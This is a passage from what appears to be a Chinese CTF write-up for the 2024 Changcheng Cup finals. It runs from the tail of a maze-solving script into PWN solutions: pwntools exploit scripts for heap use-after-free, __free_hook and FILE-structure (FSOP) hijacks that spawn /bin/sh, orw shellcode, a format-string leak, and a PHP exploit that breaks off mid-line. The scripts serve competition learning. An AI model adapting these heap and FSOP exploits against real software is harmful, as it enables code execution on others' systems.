dire=dire[:-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">while</span> i==<span class="hljs-number">4</span>:<br>                num,i=stack.pop()<br>                x,y=road.pop()<br>                dire=dire[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">else</span>:<br>            num=<span class="hljs-number">0</span><br>            i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> dire,<span class="hljs-literal">True</span><br><br><span class="hljs-built_in">print</span>(getdire())<br><br><span class="hljs-comment"># ssssddwwwwddddssaassssssaassddssaassddssddssssssddssaassddssddwwddssssddwwddddssssssssssddddddddddwwddssddddddwwaawwddwwaaaawwddddddssssssss</span><br></code></pre></td></tr></table></figure><h1 id="PWN">PWN</h1><h2 id="Old-man-v1">Old_man_v1</h2><p>UAF秒了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;needed&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;add?&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;include?:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;about:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;needed&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit?&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;about:&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;needed&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;delete?&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;needed&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;show?\n&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><br>p=remote(<span class="hljs-string">&#x27;202.0.5.71&#x27;</span>,<span class="hljs-number">9999</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>) <br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc.address=(u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x58</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>])&amp;(~<span class="hljs-number">0xfff</span>)<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,p64(free_hook))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure><h2 id="SandBoxShell">SandBoxShell</h2><p>orw shellcode秒了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>p=remote(<span class="hljs-string">&quot;202.0.5.71&quot;</span>,<span class="hljs-number">8888</span>)<br>e=ELF(<span class="hljs-string">&quot;SandBoxShell&quot;</span>)<br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,e.bss(<span class="hljs-number">0x200</span>),<span class="hljs-number">0x300</span>)+shellcraft.write(<span class="hljs-number">1</span>,e.bss(<span class="hljs-number">0x200</span>),<span class="hljs-number">0x300</span>)<br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="not-so-aarch64">not_so_aarch64</h2><p>堆题都一样，半秒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;aarch64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content: &#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">data</span>):<br>    mark=<span class="hljs-number">0xfff000000000</span><br>    data1=data&amp;mark<br>    result=<span class="hljs-number">0</span><br>    result|=data1<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data1=((data1&gt;&gt;<span class="hljs-number">12</span>)^data)&amp;(mark&gt;&gt;<span class="hljs-number">12</span>)<br>        result|=data1<br>        mark=mark&gt;&gt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> result<br>    <span class="hljs-keyword">pass</span><br><br><br>p=remote(<span class="hljs-string">&#x27;202.0.5.71&#x27;</span>,<span class="hljs-string">&#x27;6666&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x461</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>) <span class="hljs-comment">#2     </span><br>add(<span class="hljs-number">0x58</span>,<span class="hljs-string">b&#x27;123123123&#x27;</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#7</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#8 </span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#9</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#10</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#11</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#12</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#13</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#14</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#15</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#16</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br>heap=calc(d)&amp;(~<span class="hljs-number">0xfff</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>free(<span class="hljs-number">1</span>)<br>f_chunk3=heap+<span class="hljs-number">0x2a0</span>+(<span class="hljs-number">0x20</span>+<span class="hljs-number">0x60</span>)*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x20</span><br>add(<span class="hljs-number">0x18</span>,p64(<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">1</span>)+p64(f_chunk3)) <span class="hljs-comment">#17</span><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">2</span>)<br><br>p.read(<span class="hljs-number">0x20</span>)<br>libc.address=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x19cb10</span><br>unsortedbin = libc.address+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x19cb10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>success(<span class="hljs-string">f&quot;unsorted bin: 0x<span class="hljs-subst">&#123;unsortedbin:x&#125;</span>&quot;</span>)<br><br>obstack_jumps=libc.address+<span class="hljs-number">0x199760</span>-<span class="hljs-number">0x40</span>+<span class="hljs-number">0x28</span><br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>gadget=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>vtable=stdout+<span class="hljs-number">0xd8</span><br>iolist=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(iolist))<br>success(<span class="hljs-string">f&quot;obstack_jump: 0x<span class="hljs-subst">&#123;obstack_jumps:x&#125;</span>&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">10</span>)<br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">9</span>)<br>chunk3=heap+<span class="hljs-number">0x290</span>+(<span class="hljs-number">0x20</span>+<span class="hljs-number">0x60</span>)*<span class="hljs-number">3</span>+<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(iolist))<br>obstack=heap+<span class="hljs-number">0x2a0</span>+(<span class="hljs-number">0x80</span>)*<span class="hljs-number">2</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x70</span><br>add(<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x21</span>)+p64((chunk3&gt;&gt;<span class="hljs-number">12</span>)^(vtable)))<br>fake_io=flat(&#123;<br><span class="hljs-number">0x0</span>: <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>,<br>    <span class="hljs-number">0x20</span>: <span class="hljs-number">0x8000</span>,<br>    <span class="hljs-number">0x28</span>: [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,gadget],<br>    <span class="hljs-number">0x48</span>: [obstack,<span class="hljs-number">1</span>]&#125;)<br><br>fake_io1=flat(&#123;<br><span class="hljs-number">0x18</span>: obstack_jumps+<span class="hljs-number">0x20</span>,<br>    <span class="hljs-number">0x20</span>: obstack,<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>add(<span class="hljs-number">0x68</span>,fake_io)<br>add(<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">0x68</span>,fake_io1)<br>add(<span class="hljs-number">0x18</span>,p64(obstack_jumps)+p64(obstack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(obstack))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="power-system（赛后复现）">power_system（赛后复现）</h2><p>比赛的时候只想起来<code>strncmp</code>里面<code>src</code>不能有<code>\x00</code>，不然会直接判为字符串不同，没想起来<code>dest</code>里面也有<code>\x00</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">pwd</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;account :&#x27;</span>,<span class="hljs-string">b&#x27;QAQ&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;password :&#x27;</span>,pwd)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Exit&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;power&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;staff&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">turn</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;power&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.29.so&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;b _IO_wfile_underflow\nc&#x27;</span>)<br>pause()<br>pwd=<span class="hljs-string">b&#x27;/\x05c\x01%p%p%p.%p&#x27;</span><br>login(pwd)<br>p.readuntil(<span class="hljs-string">&#x27;passwrod is&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;.&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;1.&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-<span class="hljs-number">0x1ec5c0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>fake_io_add=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br><br>gadget=libc.address+<span class="hljs-number">0xe21ce</span><br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br><br>fake_io=flat(&#123;<br><span class="hljs-number">0x8</span>-<span class="hljs-number">8</span>: fake_io_add,<br><span class="hljs-number">0x10</span>-<span class="hljs-number">8</span>: fake_io_add+<span class="hljs-number">1</span>, <br>    <span class="hljs-number">0x28</span>-<span class="hljs-number">8</span>: gadget,<br>    <span class="hljs-number">0x98</span>-<span class="hljs-number">8</span>: fake_io_add+<span class="hljs-number">0x10</span>, <br><span class="hljs-number">0xa0</span>-<span class="hljs-number">8</span>: fake_io_add+<span class="hljs-number">0x10</span>,<br><span class="hljs-number">0xd8</span>-<span class="hljs-number">8</span>: wfile_jump+<span class="hljs-number">8</span>,<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>adjust(-<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,fake_io)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="numbergame（赛后复现）">numbergame（赛后复现）</h2><p>赛后看别人的wp出的，要看出来漏洞还挺麻烦的<br><img src="/img/blog_img/2024%E7%AC%AC%E4%B8%80%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B/image-20240527193201706.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>_quicksort</code>先对数组进行快速排序，在最后会校验排序是否正确<br>当数组中中存在一个<code>数字b</code>，存在 <code>(a-b)&amp;0x80000000==0</code> <code>(b-a)&amp;0x80000000!=0</code>时，开始的快速排序会让其到数组的最后<br>但在最后的校验时 使用<code>(b-a)</code>去判断大小，因为结果为负数，所以程序会认为<code>b</code>比较小，会将他放到前面，但程序没有校验指针是否越界<br>就导致<code>b</code>可以与<code>array size</code>进行比较，当满足 <code>(b-array_size)&amp;0x80000000==0</code>时，就会将<code>b</code>放到<code>array_size</code>的高四字节</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substr</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>,<span class="hljs-variable">$start</span>,<span class="hljs-variable">$len</span></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$data</span>.=<span class="hljs-variable">$str</span>[<span class="hljs-variable">$start</span>+<span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p64</span>(<span class="hljs-params"><span class="hljs-variable">$num</span>,<span class="hljs-variable">$len</span>=<span class="hljs-number">8</span></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$cache</span>=<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$num</span>));<br>    <span class="hljs-variable">$cache</span>=<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$cache</span>).<span class="hljs-string">&quot;\0\0\0\0\0\0\0&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$data</span>.=<span class="hljs-variable">$cache</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><br><span class="hljs-variable">$libc</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$mbase</span>=<span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$d</span>,<span class="hljs-variable">$off</span>=<span class="hljs-number">0</span></span>)</span>&#123;<br>    <span class="hljs-variable">$d</span>.=<span class="hljs-string">&quot;\0\0\0\0\0\0\0\0\0&quot;</span>;<br>    <span class="hljs-variable">$chunk</span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0x7</span>+<span class="hljs-variable">$off</span>;<span class="hljs-variable">$i</span>&gt;=<span class="hljs-variable">$off</span>;<span class="hljs-variable">$i</span>--)&#123;<br>        <span class="hljs-variable">$chunk</span>=<span class="hljs-variable">$chunk</span>&lt;&lt;<span class="hljs-number">8</span>;<br>        <span class="hljs-variable">$chunk</span>+=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$d</span>[<span class="hljs-variable">$i</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$chunk</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">outdata</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$addr</span>=<span class="hljs-number">0</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$addr</span>==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;data: &quot;</span>.<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$data</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$addr</span> : &quot;</span>.<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$data</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leakaddr</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$libc</span>,<span class="hljs-variable">$mbase</span>;<br>    <span class="hljs-variable">$p</span> = <span class="hljs-string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* 